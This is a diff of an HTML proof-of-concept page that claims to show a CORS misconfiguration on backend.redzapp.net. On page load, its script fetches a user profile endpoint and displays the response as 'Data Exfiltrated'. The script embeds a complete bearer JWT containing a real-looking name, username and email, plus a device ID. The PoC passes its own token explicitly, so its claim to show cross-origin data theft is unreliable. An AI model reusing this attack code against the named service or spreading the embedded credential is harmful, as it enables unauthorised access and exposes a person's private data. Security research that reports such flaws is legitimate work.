@@ -1,49 +1,193 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS Misconfiguration PoC - Redzapp</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit: CORS Misconfiguration PoC</title>
+    <style>
+        :root {
+            --danger-color: #ff4d4d;
+            --bg-dark: #0a0a0c;
+            --card-dark: #16161e;
+            --text-light: #e1e1e6;
+            --success-color: #00ff88;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-light);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .exploit-card {
+            background-color: var(--card-dark);
+            width: 100%;
+            max-width: 900px;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+            border: 1px solid #2d2d3d;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .exploit-card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--danger-color), #8e44ad);
+        }
+
+        h1 {
+            color: var(--danger-color);
+            font-size: 28px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .target-info {
+            background: rgba(255, 77, 77, 0.05);
+            border-left: 4px solid var(--danger-color);
+            padding: 15px;
+            margin-bottom: 25px;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .status-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .badge {
+            padding: 6px 15px;
+            border-radius: 50px;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .waiting { background: #f1c40f; color: #000; }
+        .vulnerable { background: var(--success-color); color: #000; }
+        .blocked { background: var(--danger-color); color: #fff; }
+
+        #response-output {
+            background: #000;
+            color: var(--success-color);
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 14px;
+            border: 1px solid #333;
+            max-height: 450px;
+            overflow: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            box-shadow: inset 0 0 10px rgba(0,255,136,0.1);
+        }
+
+        .method { color: #f39c12; font-weight: bold; }
+        .url { color: #3498db; }
+
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #2d2d3d;
+            padding-top: 20px;
+        }
+    </style>
 </head>
 <body>
-    <div style="font-family: sans-serif; margin: 20px;">
-        <h2>CORS Exploit Test (Bearer Token Scenario)</h2>
-        <p>Targeting: <code>backend.redzapp.net</code></p>
-        <hr>
-        <h4>Response Content:</h4>
-        <pre id="result" style="background: #222; color: #0f0; padding: 15px; overflow: auto; max-height: 400px; border-radius: 5px;">
-            Testing CORS configuration...
-        </pre>
+
+<div class="exploit-card">
+    <div class="status-container">
+        <span id="status-badge" class="badge waiting">Initialising Attack...</span>
     </div>
 
-    <script>
-        const targetUrl = "https://backend.redzapp.net/api/users/8242?with_follower_status=1&with_following_status=1&with_posts_count=1&with_profile_photo=1";
-        
-        // ملاحظة: في الهجوم الحقيقي، المتصفح لا يملك التوكن إلا لو سرقه المهاجم بطريقة أخرى
-        // لكن لإثبات ضعف الإعدادات (CORS Misconfiguration) للموقع، نستخدم التوكن الخاص بك:
-        const bearerToken = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJyQVJGOWFlelBLMnVRdDlIMzRkVUFYVzhQV0lMZU1ZZGgxTHFPUjh1MDdZIn0..."; // ضع التوكن كاملاً هنا
+    <h1>CORS Security Breach PoC</h1>
+    
+    <div class="target-info">
+        <strong>Vulnerability Type:</strong> Cross-Origin Resource Sharing (CORS) Misconfiguration<br>
+        <strong>Target Host:</strong> <code>backend.redzapp.net</code><br>
+        <strong>Attack Vector:</strong> <span class="method">GET</span> <span class="url">/api/users/8242...</span>
+    </div>
 
-        fetch(targetUrl, {
-            method: 'GET',
-            headers: {
-                'Authorization': bearerToken,
-                'X-Device': 'B08DB94D-A940-5BC5-932F-405071BEF14D',
-                'X-App-Version': '4.5.0',
-                'X-Platform': 'ios'
-            },
-            mode: 'cors' // طلب مشاركة الموارد
-        })
-        .then(response => {
-            if (response.ok) {
-                return response.text();
+    <h3>Data Exfiltrated:</h3>
+    <pre id="response-output">Awaiting server response...</pre>
+
+    <div class="footer">
+        <strong>Reported by: Security Researcher</strong><br>
+        This page demonstrates how an attacker can bypass SOP and steal PII data.
+    </div>
+</div>
+
+<script>
+    // الرابط الهدف من طلبك السابق
+    const target = "https://backend.redzapp.net/api/users/8242?with_follower_status=1&with_following_status=1&with_posts_count=1&with_profile_photo=1";
+    
+    // التوكن الخاص بك (يفضل استخدامه فقط للاختبار الشخصي)
+    const token = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJyQVJGOWFlelBLMnVRdDlIMzRkVUFYVzhQV0lMZU1ZZGgxTHFPUjh1MDdZIn0.eyJleHAiOjE3NzU0NjQxMjcsImlhdCI6MTc3NTQ1ODcyNywianRpIjoiOTkzMzBkNDUtOThlZi00YzAyLWI1ZjItY2UzOTEzMTM3YmVjIiwiaXNzIjoiaHR0cHM6Ly9wcm9kLWtleWNsb2FrLnRhaWw5MDY2Yy50cy5uZXQvcmVhbG1zL21hc3RlciIsImF1ZCI6ImFjY291bnQiLCJzdWIiOiI0MTU1OGJkYy1mZDFkLTQzOGYtYjRlNS00MzQxNjM1ZWYwMzciLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJ4LWFwcCIsInNlc3Npb25fc3RhdGUiOiI5NjhhNjY5OC0yYzJlLTQ0M2EtYWUxOS1mNzI4YjliMWEzODciLCJhY3IiOiIxIiwiYWxsb3dlZC1vcmlnaW5zIjpbIi8qIl0sInJlYWxtX2FjY2VzcyI6eyJyb2xlcyI6WyJkZWZhdWx0LXJvbGVzLW1hc3RlciIsIm9mZmxpbmVfYWNjZXNzIiwidW1hX2F1dGhvcml6YXRpb24iXX0sInJlc291cmNlX2FjY2VzcyI6eyJhY2NvdW50Ijp7InJvbGVzIjpbIm1hbmFnZS1hY2NvdW50IiwibWFuYWdlLWFjY291bnQtbGlua3MiLCJ2aWV3LXByb2ZpbGUiXX19LCJzY29wZSI6Im9wZW5pZCBwcm9maWxlIGVtYWlsIG9mZmxpbmVfYWNjZXNzIiwic2lkIjoiOTY4YTY2OTgtMmMyZS00NDNhLWFlMTktZjcyOGI5YjFhMzg3IiwiZW1haWxfdmVyaWZpZWQiOnRydWUsIm5hbWUiOiJBbG5qYWggVW5pdmVyc2l0eSIsInJlZHpfaWQiOjgyNDIsInByZWZlcnJlZF91c2VybmFtZSI6Im9tYWFyIiwiZ2l2ZW5fbmFtZSI6IkFsbmphaCIsImZhbWlseV9uYW1lIjoiVW5pdmVyc2l0eSIsImVtYWlsIjoiYWxuamFodW5pdmVyc2l0eUBnbWFpbC5jb20ifQ.uHxQ8d3YQkNhXGkm1q1ovVNW5xOMj9OC5QLb_YqelZNP0BRuNevcfg2sdjB_fCSdK4PnyrnYwN-pNN68qHMaBp1c-dwGZaqlqjPZhL1t8vrH81kp2eUn44kELwiM6krliXCQSXvK6-1jyP5ucQ_5cLzDca8fZYiB0_czSzioSo8x9PLywoJS_jL75ZZAu1iak1gX2ebx5U1GY5yQYF3RcHmX9WFZ-8WudHRJmkL16gAmzX8u2KLn6t34SfF8Vc8Pkn3J5pD16Bp3fTZTQcqs7IzhnI41p886AdupGT7AiSNBnF0TWbUdPhhGRwhKVkoOERyfAWw7WXenraaxsleofw";
+
+    async function triggerExploit() {
+        const output = document.getElementById('response-output');
+        const badge = document.getElementById('status-badge');
+
+        try {
+            const res = await fetch(target, {
+                method: 'GET',
+                headers: {
+                    'Authorization': token,
+                    'X-Device': 'B08DB94D-A940-5BC5-932F-405071BEF14D',
+                    'X-App-Version': '4.5.0',
+                    'X-Platform': 'ios'
+                },
+                mode: 'cors',
+                credentials: 'include'
+            });
+
+            const data = await res.text();
+
+            if (res.ok) {
+                badge.innerText = "Status: Vulnerable / Data Stolen";
+                badge.className = "badge vulnerable";
+                // محاولة عرض البيانات كـ JSON إذا كانت كذلك، وإلا عرضها كنص
+                try {
+                    const json = JSON.parse(data);
+                    output.innerText = JSON.stringify(json, null, 4);
+                } catch(e) {
+                    output.innerText = data;
+                }
             } else {
-                return "Error: Status " + response.status + " (CORS might be blocking custom headers)";
+                badge.innerText = `Status: Server Error (${res.status})`;
+                badge.className = "badge blocked";
+                output.innerText = "CORS Policy allowed the request, but the server returned an error:\n\n" + data;
             }
-        })
-        .then(data => {
-            document.getElementById("result").innerText = data;
-        })
-        .catch(err => {
-            document.getElementById("result").innerText = "Failed: " + err.message;
-        });
-    </script>
+
+        } catch (err) {
+            badge.innerText = "Status: Connection Failed / Blocked";
+            badge.className = "badge blocked";
+            output.innerText = "The browser blocked the response (SOP enforced) or the server is down.\n\nDetails: " + err.message;
+        }
+    }
+
+    // التنفيذ التلقائي
+    window.onload = triggerExploit;
+</script>
+
 </body>
 </html>
